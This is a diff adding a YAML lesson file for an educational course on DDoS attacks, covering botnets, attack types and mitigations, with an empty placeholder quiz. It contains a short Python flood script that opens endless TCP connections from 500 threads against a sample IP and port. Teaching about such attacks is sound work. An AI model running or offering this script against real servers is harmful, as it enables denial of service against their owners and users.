@@ -1,0 +1,97 @@
+# yaml-language-server: $schema=https://vscodeedu.com/assets/schema/course-v2.schema.json
+id: lessonpart7
+title: DDoS (Distributed Denial-of-Service)
+content: >
+  ### Understanding DDoS Attacks
+
+
+  A Distributed Denial-of-Service (DDoS) attack is a malicious attempt to
+  disrupt the normal functioning of a targeted server, service, or network by
+  overwhelming it with a flood of internet traffic. This is achieved by using
+  multiple compromised computer systems as sources of attack traffic. These
+  systems can include computers and other networked resources such as IoT
+  devices.
+
+
+  #### How DDoS Works
+
+
+  1. **Botnets**: Attackers often use a network of infected devices, known as a
+  botnet, to carry out a DDoS attack. Each device in the botnet sends requests
+  to the target, causing it to become overwhelmed and unable to function
+  properly.
+
+
+  2. **Traffic Overload**: The target system is flooded with more requests than
+  it can handle, leading to slow performance or complete unavailability of the
+  service.
+
+
+  3. **Types of DDoS Attacks**:
+     - **Volume-based attacks**: These use high traffic to saturate the bandwidth of the target.
+     - **Protocol attacks**: These consume actual server resources or intermediate communication equipment.
+     - **Application layer attacks**: These target the application layer, where web pages are generated on the server and delivered in response to HTTP requests.
+
+  #### Code Example: Simulating a Simple DDoS Attack
+
+
+  Below is a simplified Python script that demonstrates how a DDoS attack might
+  be simulated for educational purposes. **Note: This code is for educational
+  purposes only and should not be used for malicious activities.**
+
+
+  ```python
+
+  import socket
+
+  import threading
+
+
+  target_ip = '192.168.1.1'  # Example target IP
+
+  target_port = 80           # Example target port
+
+
+  def attack():
+      while True:
+          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+          s.connect((target_ip, target_port))
+          s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
+          s.close()
+
+  for i in range(500):  # Number of threads
+      thread = threading.Thread(target=attack)
+      thread.start()
+  ```
+
+
+  #### Mitigation Strategies
+
+
+  1. **Rate Limiting**: Limit the number of requests a user can make to a server
+  in a given time frame.
+
+  2. **Web Application Firewalls (WAF)**: Use WAFs to filter and monitor HTTP
+  traffic between a web application and the Internet.
+
+  3. **Traffic Analysis**: Continuously analyze traffic to detect and mitigate
+  potential DDoS attacks.
+
+
+  Understanding DDoS attacks is crucial for developing robust security measures
+  to protect online services. Always ensure that your systems are equipped with
+  the necessary defenses to mitigate such threats.
+questionGroups:
+  - id: "1"
+    questions:
+      - id: "1"
+        type: choice
+        content: ""
+        options:
+          - id: "1"
+            value: ""
+            isCorrect: true
+          - id: "2"
+            value: ""
+          - id: "3"
+            value: ""
